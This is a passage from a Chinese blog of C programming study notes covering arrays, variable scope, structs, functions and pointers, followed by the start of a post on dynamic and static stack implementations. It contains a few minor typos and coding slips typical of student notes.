<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line">  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">  <span class="meta">#<span class="meta-keyword">define</span> Lenth 5</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> test[Lenth] = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> &#125;;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; Lenth; i++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"test数组的第%d个元素为%d,\n"</span>, i+<span class="number">1</span>, test[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果为： &gt;test 数组的第 1 个元素为 1,<br>test 数组的第 2 个元素为 2,<br>test 数组的第 3 个元素为 3,<br>test 数组的第 4 个元素为 4,<br>test 数组的第 5 个元素为 5,</p>
<p><strong>大括号 { } 之间的值的数目不能大于我们在数组声明时在方括号 [ ] 中指定的元素数目。</strong></p>
<p><strong>若是大括号{ }之间的值小于我们在数组声明时在方括号中指定的元素数目，则没有值与之对应的数组元素自动赋 0</strong></p>
<p><strong>只能给元素逐个赋值，不能给数组整体赋值。例如给十个元素全部赋 1 值，只能写为：int a[10]={1,1,1,1,1,1,1,1,1,1};而不能写为：int a[10]=1.</strong></p>
<p><strong>如不给可初始化的数组赋初值，则全部元素均为 0 值。</strong></p>
<p>以上规则也适用于 <strong>其他类型的数组</strong><br>例如，有以下程序：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;  </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> Lenth 6</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> test[Lenth] = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; Lenth; i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"test 数组的第%d 个元素为%d,\n"</span>, i+<span class="number">1</span>, test[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果为： &gt;test 数组的第 1 个元素为 1,<br>test 数组的第 2 个元素为 2,<br>test 数组的第 3 个元素为 3,<br>test 数组的第 4 个元素为 4,<br>test 数组的第 5 个元素为 5,<br>test 数组的第 6 个元素为 0,</p>
<p>如果在初始化时省略掉了数组的大小，数组的大小则为初始化时元素的个数。因此，如果我们初始化：<code>int test[] = {1, 2, 3, 4, 5};</code><br>那么创建的这个数组，它与前一个例子中所创建的数组是完全相同的。</p>
<h3 id="一维字符数组的初始化"><a href="#一维字符数组的初始化" class="headerlink" title="一维字符数组的初始化"></a>一维字符数组的初始化</h3><p>C 语言允许用字符串的方式对数组作初始化赋值。例如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> c[<span class="number">9</span>]=&#123;<span class="string">'c'</span>,<span class="string">' '</span>,<span class="string">'p'</span>,<span class="string">'r'</span>,<span class="string">'o'</span>,<span class="string">'g'</span>,<span class="string">'r'</span>,<span class="string">'a'</span>,<span class="string">'m'</span>&#125;;</span><br></pre></td></tr></table></figure>

<p>可写为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> c[<span class="number">10</span>]=&#123;<span class="string">"C program"</span>&#125;; 或去掉&#123;&#125;写为：</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> c[<span class="number">10</span>]=<span class="string">"C program"</span>;</span><br></pre></td></tr></table></figure>

<p>需要注意的是，用字符串给字符数组赋值时由于要添加结束符 ‘<code>\0</code>‘，数组的长度要比字符串的长度（字符串长度不包括 ‘<code>\0&#39;</code>）大 1。例如：<br>char str[] = “C program”;<br>该数组在内存中的实际存放情况为：<br><img src="http://c.biancheng.net/cpp/uploads/allimg/120129/sfdsgfsge.png" alt="数组在内存中的存放情况"><br>字符串长度为 9，数组长度为 10。<br>因此我们需要增加一个字符数组长度用来存放\0。</p>
<p>并且，上述这种字符数组的整体赋值只能在字符数组初始化时使用，不能用于字符数组的赋值，字符数组的赋值只能对其元素一一赋值，下面的赋值方法是错误的。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> str[];</span><br><span class="line">str=<span class="string">"I am happy"</span>;<span class="comment">//错误，字符数组的赋值只能按元素一一赋值</span></span><br></pre></td></tr></table></figure>

<p>当对全体元素赋初值时也可以省去长度说明。例如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> c[]=&#123;<span class="string">'c'</span>,<span class="string">' '</span>,<span class="string">'p'</span>,<span class="string">'r'</span>,<span class="string">'o'</span>,<span class="string">'g'</span>,<span class="string">'r'</span>,<span class="string">'a'</span>,<span class="string">'m'</span>&#125;;</span><br></pre></td></tr></table></figure>

<p>这时 C 数组的长度自动定为 9。</p>
<h3 id="二维数字数组的初始化"><a href="#二维数字数组的初始化" class="headerlink" title="二维数字数组的初始化"></a>二维数字数组的初始化</h3><p>example：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a[<span class="number">5</span>][<span class="number">3</span>]=&#123;&#123;<span class="number">80</span>,<span class="number">75</span>,<span class="number">92</span>&#125;,&#123;<span class="number">61</span>,<span class="number">65</span>&#125;,&#123;<span class="number">59</span>,<span class="number">63</span>,<span class="number">70</span>&#125;,&#123;<span class="number">85</span>,<span class="number">90</span>&#125;,&#123;<span class="number">76</span>,<span class="number">77</span>,<span class="number">85</span>&#125;&#125;;</span><br></pre></td></tr></table></figure>

<p>每个内层的{}，初始化数组中的一行。<br>同样地，二维数组初始化时，如果对每行都进行了初始化，则也可以不给出行数:<br>example：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a[][<span class="number">3</span>]=&#123; &#123;<span class="number">80</span>,<span class="number">75</span>,<span class="number">92</span>&#125;,&#123;<span class="number">61</span>,<span class="number">65</span>&#125; &#125;;</span><br></pre></td></tr></table></figure>

<p>a 是一个 2 行 3 列的数组，a[1][2]被初始化成 0。</p>
<h3 id="二维字符数组的初始化"><a href="#二维字符数组的初始化" class="headerlink" title="二维字符数组的初始化"></a>二维字符数组的初始化</h3><p>通常情况下，二维数组的每一行分别使用一个字符串进行初始化。 例如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> c[<span class="number">3</span>][<span class="number">8</span>]=&#123;&#123;<span class="string">"apple"</span>&#125;,&#123;<span class="string">"orange"</span>&#125;,&#123;<span class="string">"banana"</span>&#125;&#125;;</span><br></pre></td></tr></table></figure>

<p>等价于：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> c[<span class="number">3</span>][<span class="number">8</span>]=&#123;<span class="string">"apple"</span>,<span class="string">"orange"</span>,<span class="string">"banana"</span>&#125;;</span><br></pre></td></tr></table></figure>

<p>以上两条初始化语句中，二维数组的第一维大小均可省略。数组 c 的逻辑结构如下所示：<br>| |0|1|2|3|4|5|6|7|<br>|–|–|–|–|–|–|–|–|–|<br>|c[0]|a|p|p|l|e|\0|\0|\0|<br>|c[1]|o|r|a|n|g|e|\0|\0|<br>|c[2]|b|a|n|a|n|a|\0|\0|</p>
<h3 id="二维数字数组的存放方式"><a href="#二维数字数组的存放方式" class="headerlink" title="二维数字数组的存放方式"></a>二维数字数组的存放方式</h3><p>数组 T a[N][m] 每一行都有 M 个元素<br>第 i 行的元素就是 a[i][0]、a[i][1]……a[i][m-1]。<br>同一行的元素，在内存中是连续存放的。<br>第 j 列的元素的元素，就是 a[0][j]、a[1][j]……a[N-1][j]。<br>a[0][0]是数组中地址最小的元素。如果 a[0][0]存放在地址 n，则 a[i][j]存放的地址就是：n + i × M× sizeof(T) + j × sizeof(T)</p>
<h3 id="数组越界"><a href="#数组越界" class="headerlink" title="数组越界"></a>数组越界</h3><p>数组元素的下标，可以是任何整数，可以是负数，也可以大于数组的元素个数。不会导致编译错误：<br>example：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a[<span class="number">10</span>];</span><br><span class="line">a[<span class="number">-2</span>] = <span class="number">5</span>;</span><br><span class="line">a[<span class="number">200</span>] = <span class="number">10</span>;</span><br><span class="line">a[<span class="number">10</span>] = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">int</span> m = a[<span class="number">30</span>];</span><br></pre></td></tr></table></figure>

<p>但运行时很可能会出错!<br>a[-2] = 5; a[200] = 10; a[10] = 20;int m = a[30];均可能导致程序运行出错！！！<br>因为可能引起意外修改其他变量的值，导致程序运行结果不正确<br>可能试图访问不该访问的内存区域，导致程序崩溃<br>数组越界的程序，用某些编译器编译后可能可以正确运行，换一个编译器编译后就运行错误<br>最可怕的是，编译器不会报错。</p>
<p>因此，我们在使用数组时，最好能初始化/声明地大一些</p>
<h2 id="0x05-标识符的作用域，结构体"><a href="#0x05-标识符的作用域，结构体" class="headerlink" title="0x05 标识符的作用域，结构体"></a>0x05 标识符的作用域，结构体</h2><h3 id="标识符的作用域"><a href="#标识符的作用域" class="headerlink" title="标识符的作用域"></a>标识符的作用域</h3><h4 id="C-语言中的全局变量、局部变量、静态变量"><a href="#C-语言中的全局变量、局部变量、静态变量" class="headerlink" title="C 语言中的全局变量、局部变量、静态变量"></a>C 语言中的全局变量、局部变量、静态变量</h4><p>要想学习变量的作用域，首先要搞懂 C 中的全局变量、局部变量、静态变量</p>
<p>局部变量：定义在函数内部的变量叫局部变量（函数的形参也是局部变量）</p>
<p>全局变量：定义在所有函数的外面的变量叫全局变量<br>全局变量在所有函数中均可以使用，局部变量只能在定义它的函数内部使用</p>
<p>静态变量：全局变量都是静态变量。局部变量定义时如果前面加了“static”关键字，则该变量也成为静态变量<br>静态变量的存放地址，在整个程序运行期间，都是固定不变的<br>非静态变量(一定是局部变量)地址每次函数调用时都可能不同,在函数的一次执行期间不变<br>如果未明确初始化，则静态变量会被自动初始化成全 0(每个 bit 都是 0），局部非静态变量的值则随机</p>
<h4 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h4><p>变量名、函数名、类型名统称为“标识符”。一个标识符能够起作用的范围，叫做该标识符的作用域</p>
<p>在一个标识符的作用域之外使用该标识符，会导致“标识符没有定义”的编译错误。使用标识符的语句，必须出现在它们的声明或定义之后<br>在单文件的程序中，结构、函数和全局变量的作用域是其定义所在的整个文件</p>
<p>函数形参的作用域是整个函数<br>局部变量的作用域，是从定义它的语句开始，到包含它的最内层的那一对大括号“{}”的右大括号 “}”为止。<br>for 循环里定义的循环控制变量，其作用域就是整个 for 循环<br>同名标示符的作用域，可能一个被另一个包含。则在小的作用域里，作用域大的那个标识符被屏蔽，不起作用。</p>
<h4 id="生存期"><a href="#生存期" class="headerlink" title="生存期"></a>生存期</h4><p>所谓变量的“生存期”，指的是在此期间，变量占有内存空间，其占有的内存空间只能归它使用，不会被用来存放别的东西。<br>而变量的生存期终止，就意味着该变量不再占有内存空间，它原来占有的内存空间，随时可能被派做他用。</p>
<p>全局变量的生存期，从程序被装入内存开始，到整个程序结束。<br>静态局部变量的生存期，从定义它语句第一次被执行开始，到整个程序结束为止。<br>函数形参的生存期从函数执行开始，到函数返回时结束。非静态局部变量的生存期，从执行到定义它的语句开始，一旦程序执行到了它的作用域之外，其生存期就终止。</p>
<h3 id="使用-struct-定义结构体"><a href="#使用-struct-定义结构体" class="headerlink" title="使用 struct 定义结构体"></a>使用 struct 定义结构体</h3><p>我们可以使用“struct”关键字来定义一个“结构”，也就是说定义了一个新的结构数据类型：<br>定义方式:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> 结构名</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">类型名 成员变量名；</span><br><span class="line">类型名 成员变量名；</span><br><span class="line">类型名 成员变量名；</span><br><span class="line">……</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>example:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> ID;</span><br><span class="line"><span class="keyword">char</span> Name[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">float</span> GPA;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>在经过这条语句之后 Student 即成为自定义类型的名字，可以用来定义变量<br><code>Stuent s1,s2;</code></p>
<h3 id="使用结构体获得、写入结构体内部的成员变量"><a href="#使用结构体获得、写入结构体内部的成员变量" class="headerlink" title="使用结构体获得、写入结构体内部的成员变量"></a>使用结构体获得、写入结构体内部的成员变量</h3><p>一个结构变量的成员变量，可以完全和一个普通变量一样来使用，也可以取得其地址。使用形式：<br>结构变量名.成员变量名<br>example：对于以下定义的 StudentEx 与 Date 结构体数据类型</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Date</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> year;</span><br><span class="line"><span class="keyword">int</span> month;</span><br><span class="line"><span class="keyword">int</span> day;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">StudentEx</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> ID;</span><br><span class="line"><span class="keyword">char</span> Name[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">float</span> GPA;</span><br><span class="line">Date birthday;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>我们可以运行以下的 main()代码段：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">StudentEx stu;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%f"</span>, &amp;stu.GPA);</span><br><span class="line">stu.ID = <span class="number">12345</span>;</span><br><span class="line">stu.Name[]=&#123;<span class="string">'Z'</span>,<span class="string">'a'</span>,<span class="string">'m'</span>&#125;;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%f"</span>,stu.GPA);</span><br><span class="line">stu.birthday.year = <span class="number">1984</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> * p = &amp; stu.ID; <span class="comment">//p指向stu中的ID成员变量</span></span><br></pre></td></tr></table></figure>

<h3 id="结构变量的初始化"><a href="#结构变量的初始化" class="headerlink" title="结构变量的初始化"></a>结构变量的初始化</h3><p>结构变量可以在定义时进行初始化:<br>例如对上面的例子，我们可以通过以下语句对结构变量进行初始化</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">StudentEx stu = &#123; <span class="number">1234</span>,<span class="string">"Tom"</span>,<span class="number">3.78</span>,&#123; <span class="number">1984</span>,<span class="number">12</span>,<span class="number">28</span> &#125;&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="指向结构变量的指针"><a href="#指向结构变量的指针" class="headerlink" title="指向结构变量的指针"></a>指向结构变量的指针</h3><h4 id="定义指向结构变量的指针"><a href="#定义指向结构变量的指针" class="headerlink" title="定义指向结构变量的指针"></a>定义指向结构变量的指针</h4><p>方式：<br><code>结构名 * 指针变量名;</code><br>example:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">StudentEx * pStudent;<span class="comment">//定义了* pStudent为StudentEx类型的指针</span></span><br><span class="line">StudentEx Stu1;</span><br><span class="line">pStudent = &amp; Stu1;<span class="comment">//使得pStudent指针指向stu1变量的起始位置</span></span><br><span class="line">StudentEx Stu2 = * pStudent; <span class="comment">//将pStudent指针指向的stu1变量赋值给stu2变量</span></span><br></pre></td></tr></table></figure>

<h4 id="通过指针，访问其指向的结构变量的成员变量"><a href="#通过指针，访问其指向的结构变量的成员变量" class="headerlink" title="通过指针，访问其指向的结构变量的成员变量"></a>通过指针，访问其指向的结构变量的成员变量</h4><p>方式：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">指针-&gt;成员变量名</span><br><span class="line"><span class="keyword">or</span></span><br><span class="line">(* 指针).成员变量名</span><br></pre></td></tr></table></figure>

<p>example:<br>对于‘使用结构体获得、写入结构体内部的成员变量’中定义的结构体<br>可以使用以下语句：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">StudentEx Stu;</span><br><span class="line">StudentEx * pStu;</span><br><span class="line">pStu = &amp; Stu;</span><br><span class="line">pStu-&gt;ID = <span class="number">12345</span>;</span><br><span class="line">( * pStu).GPA = <span class="number">3.48</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>,Stu.ID) <span class="comment">//输出 12345</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%f\n"</span>,Stu.GPA); <span class="comment">//输出 3.48</span></span><br></pre></td></tr></table></figure>

<h2 id="0x06-C-语言函数"><a href="#0x06-C-语言函数" class="headerlink" title="0x06 C 语言函数"></a>0x06 C 语言函数</h2><h3 id="函数的定义"><a href="#函数的定义" class="headerlink" title="函数的定义"></a>函数的定义</h3><p>一般来说函数的定义必须出现在函数调用语句之前，否则调用语句编译出错<br>函数的定义方式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">返回值类型 函数名(参数1类型 参数1名称, 参数2类型 参数2名称……)</span><br><span class="line">&#123;</span><br><span class="line">语句组(即“函数体”）</span><br><span class="line">return 返回值；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果函数不需要返回值，则“返回值类型”可以写“void”</p>
<h3 id="函数的调用"><a href="#函数的调用" class="headerlink" title="函数的调用"></a>函数的调用</h3><p>调用函数语句：<br><code>函数名（参数1,参数2，……）</code></p>
<h3 id="return-语句"><a href="#return-语句" class="headerlink" title="return 语句"></a>return 语句</h3><p>对函数的调用，也是一个表达式。函数调用表达式的值，由函数内部的 return 语句决定。<br>return 语句语法如下：<br><code>return 返回值；</code><br>return 语句的功能是结束函数的执行，并将“返回值”作为结果返回。“返回值”是常量、变量或复杂的表达式均可。<br>如果函数返回值类型为“void”，return 语句就直接写：<br><code>return ;</code><br>需要注意的是，return 语句作为函数的出口，可以在函数中多次出现。多个 return 语句的“返回值”可以不同。在哪个 return 语句结束函数，函数的返回值就和哪个 return 语句里面的“返回值”相等。</p>
<h2 id="0x07-C-语言的指针"><a href="#0x07-C-语言的指针" class="headerlink" title="0x07 C 语言的指针"></a>0x07 C 语言的指针</h2><h3 id="C-语言指针的定义"><a href="#C-语言指针的定义" class="headerlink" title="C 语言指针的定义"></a>C 语言指针的定义</h3><p>T _ p ; // T 可以是任何类型的名字，比如 int, double ,char 等等。<br>p 的类型: T _ _p 的类型： T<br>通过表达式 _ p，可以读写从地址 p 开始的 sizeof(T)个字节<br>*p 等价于存放在地址 p 处的一个 T 类型的变量</p>
<ul>
<li>间接引用运算符 sizeof(T*) 4 字节（64 位计算机上可能 8 字节）</li>
</ul>
<h3 id="指针的用法"><a href="#指针的用法" class="headerlink" title="指针的用法"></a>指针的用法</h3><p>&amp; : 取地址运算符<br>&amp;x : 变量 x 的地址（即指向 x 的指针)<br>对于类型为 T 的变量 x，&amp;x 表示变量 x 的地址(即指向 x 的指针) &amp;x 的类型是 T * 。<br>example：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> ch1 = <span class="string">'A'</span>;</span><br><span class="line"><span class="keyword">char</span> * pc = &amp;ch1; <span class="comment">// 使得pc 指向变量ch1</span></span><br><span class="line"> * pc = <span class="string">'B'</span>; <span class="comment">// 使得ch1 = 'B'</span></span><br><span class="line"> <span class="keyword">char</span> ch2 = * pc;  <span class="comment">// 使得ch2 = ch1</span></span><br><span class="line"> pc = &amp; ch2; <span class="comment">// 使得pc 指向变量ch2</span></span><br><span class="line"> * pc = <span class="string">'D'</span>; <span class="comment">// 使得ch2 = 'D'</span></span><br></pre></td></tr></table></figure>

<h3 id="指针的赋值"><a href="#指针的赋值" class="headerlink" title="指针的赋值"></a>指针的赋值</h3><p><strong>不同类型的指针，如果不经过强制类型转换，不能直接互相赋值</strong><br>example：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> * pn, <span class="keyword">char</span> * pc, <span class="keyword">char</span> c = <span class="number">0x65</span>;</span><br><span class="line">pn = pc; <span class="comment">//类型不匹配，编译出错</span></span><br><span class="line">pn = &amp; c; <span class="comment">//类型不匹配，编译出错</span></span><br><span class="line">pn = (<span class="keyword">int</span> * ) &amp; c;</span><br><span class="line"><span class="keyword">int</span> n = * pn; <span class="comment">//n值不确定</span></span><br><span class="line">* pn = <span class="number">0x12345678</span>; <span class="comment">//编译能过但运行可能出错</span></span><br></pre></td></tr></table></figure>

<h3 id="指针的运算"><a href="#指针的运算" class="headerlink" title="指针的运算"></a>指针的运算</h3><p>1） 两个 <strong>同类型</strong> 的指针变量，可以比较大小</p>
<p>若地址 p1&lt;地址 p2，则 p1&lt; p2 值为真。<br>若地址 p1=地址 p2，则 p1== p2 值为真。<br>若地址 p1&gt;地址 p2，则 p1 &gt; p2 值为真。</p>
<ol start="2">
<li>两个 <strong>同类型</strong> 的指针变量，可以相减</li>
</ol>
<p>运算规则：<br>两个 T * 类型的指针 p1 和 p2<br>p1 – p2 = ( 地址 p1 – 地址 p2 ) / sizeof(T)</p>
<p>例：int _ p1, _ p2;<br>若 p1 指向地址 2000,p2 指向地址 600, 则<br>p1 – p2 = (1000 – 600)/sizeof(int) = (2000 – 600)/4 = 350</p>
<p>3)指针变量加减一个整数的结果是指针</p>
<p>例如：<br>p : T * 类型的指针<br>n : 整数类型的变量或常量</p>
<p>则 p+n : T _ 类型的指针，指向地址： 地址 p + n × sizeof(T)<br>n+p, p-n , _ (p+n), * (p-n)等同理</p>
<ol start="4">
<li>指针变量可以自增、自减</li>
</ol>
<p>若 T* 类型的指针 p 指向地址 n<br>则 p++, ++p : p 指向 n + sizeof(T) p–, –p : p 指向 n - sizeof(T)</p>
<p>5）指针可以用下标运算符“[ ]”进行运算<br>若 p 是一个 T _ 类型的指针， n 是整数类型的变量或常量<br>则 p[n] 等价于 _ (p+n)</p>
<h2 id="Task-End"><a href="#Task-End" class="headerlink" title="Task End"></a>Task End</h2>]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>AST of EIC,HUST</tag>
        <tag>Task</tag>
      </tags>
  </entry>
  <entry>
    <title>AST-Task3</title>
    <url>/2019/11/02/AST-Task3/</url>
    <content><![CDATA[<p>鲸了！数据结构居然如此复杂！</p>
<a id="more"></a>

<h1 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h1><p>栈（stack）又名堆栈，它是一种运算受限的线性表。限定仅在表尾进行插入和删除操作的线性表。这一端被称为栈顶，相对地，把另一端称为栈底。向一个栈插入新元素又称作进栈、入栈或压栈，它是把新元素放到栈顶元素的上面，使之成为新的栈顶元素；从一个栈删除元素又称作出栈或退栈，它是把栈顶元素删除掉，使其相邻的元素成为新的栈顶元素。<br>栈可以根据是否可以动态增加存储空间，分为动态栈和静态栈两种。</p>
<h2 id="动态栈"><a href="#动态栈" class="headerlink" title="动态栈"></a>动态栈</h2><p>动态栈是建立在 malloc 函数的基础之上的一种栈结构</p>
<h3 id="动态栈的数据结构定义"><a href="#动态栈的数据结构定义" class="headerlink" title="动态栈的数据结构定义"></a>动态栈的数据结构定义</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>         //定义一个链表式结点结构体</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> * <span class="title">last</span>;</span></span><br><span class="line">&#125;*node;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Stack</span>        //定义链式栈结构体</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    node top;               <span class="comment">//栈顶指针</span></span><br><span class="line">    <span class="keyword">int</span> count;              <span class="comment">//记录栈结点数量</span></span><br><span class="line">&#125;<span class="built_in">stack</span>;</span><br></pre></td></tr></table></figure>

<p>由于动态栈的数据是可以变化的。因此在动态栈中是没有 init()操作的，每一次 push 操作都会使得动态栈的大小动态扩大。</p>
<h3 id="动态栈的入栈操作函数"><a href="#动态栈的入栈操作函数" class="headerlink" title="动态栈的入栈操作函数"></a>动态栈的入栈操作函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="built_in">stack</span> *S,<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	node curs = (node)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct Node));<span class="comment">//开辟新的存储空间用来存放链式表节点</span></span><br><span class="line">	curs -&gt; data = n;<span class="comment">//存入节点</span></span><br><span class="line">	curs -&gt; last = S-&gt;top;</span><br><span class="line">	S -&gt; top = curs;<span class="comment">//更新top指针</span></span><br><span class="line">	S -&gt; count ++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="动态栈的出栈操作函数"><a href="#动态栈的出栈操作函数" class="headerlink" title="动态栈的出栈操作函数"></a>动态栈的出栈操作函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pop</span><span class="params">(<span class="built_in">stack</span> *S)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> output;</span><br><span class="line">    node curs;                        <span class="comment">//定义一个结点指针变量</span></span><br><span class="line">    <span class="keyword">if</span>(S-&gt;count == <span class="number">0</span>)&#123;              <span class="comment">//判断栈是否为空</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Error,Stack is empty!\n"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	  curs = S-&gt;top;                <span class="comment">//让新定义的结点指针指向当前栈顶</span></span><br><span class="line">    output = curs-&gt;data;          <span class="comment">//保存当前节点的数据</span></span><br><span class="line">	  S-&gt;top = curs-&gt;last;            <span class="comment">//让栈顶指针指向栈顶结点的上一个结点</span></span><br><span class="line">	  <span class="built_in">free</span>(curs);                   <span class="comment">//释放结点s的存储空间</span></span><br><span class="line">	  S-&gt;count--;                <span class="comment">//结点个数减一</span></span><br><span class="line">    <span class="keyword">return</span> output;             <span class="comment">//返回栈顶元素</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="动态栈的取栈顶元素函数"><a href="#动态栈的取栈顶元素函数" class="headerlink" title="动态栈的取栈顶元素函数"></a>动态栈的取栈顶元素函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Gettop</span><span class="params">(<span class="built_in">stack</span> *S)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S-&gt;count == <span class="number">0</span>)                <span class="comment">//判断栈是否为空</span></span><br><span class="line">    &#123;</span><br><span class="line">	     <span class="built_in">printf</span>(<span class="string">"Error,Stack is empty!\n"</span>);</span><br><span class="line">	     <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> S-&gt;top-&gt;data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="静态栈"><a href="#静态栈" class="headerlink" title="静态栈"></a>静态栈</h2><p>静态栈是建立在静态数组的基础之上的一种栈结构。</p>
<h3 id="静态栈的数据结构定义"><a href="#静态栈的数据结构定义" class="headerlink" title="静态栈的数据结构定义"></a>静态栈的数据结构定义</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 1000</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Stack</span>     //定义栈</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> data[MAXSIZE];   <span class="comment">//栈中的数据</span></span><br><span class="line">    <span class="keyword">int</span> top;             <span class="comment">//栈顶</span></span><br><span class="line">&#125;<span class="built_in">stack</span>;</span><br></pre></td></tr></table></figure>

